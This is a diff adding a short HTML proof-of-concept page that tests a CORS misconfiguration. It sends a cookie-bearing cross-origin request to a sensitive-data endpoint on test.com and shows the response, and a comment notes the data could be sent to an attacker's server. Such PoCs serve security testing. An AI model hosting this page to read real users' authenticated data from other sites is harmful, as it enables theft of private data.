@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Misconfiguration PoC</title>
+</head>
+<body>
+    <h1>CORS Misconfiguration Test</h1>
+    <button onclick="testCORS()">Test CORS</button>
+    <div id="result"></div>
+
+    <script>
+        function testCORS() {
+            var req = new XMLHttpRequest();
+            req.onload = function() {
+                document.getElementById('result').innerText = 'Response received: ' + this.responseText;
+                // In a real attack, you might send this data to your server
+                // console.log('Data received:', this.responseText);
+            };
+            req.onerror = function() {
+                document.getElementById('result').innerText = 'CORS request failed';
+            };
+            req.open('GET', 'https://test.com/api/sensitive-data', true);
+            req.withCredentials = true;
+            req.send();
+        }
+    </script>
+</body>
+</html>
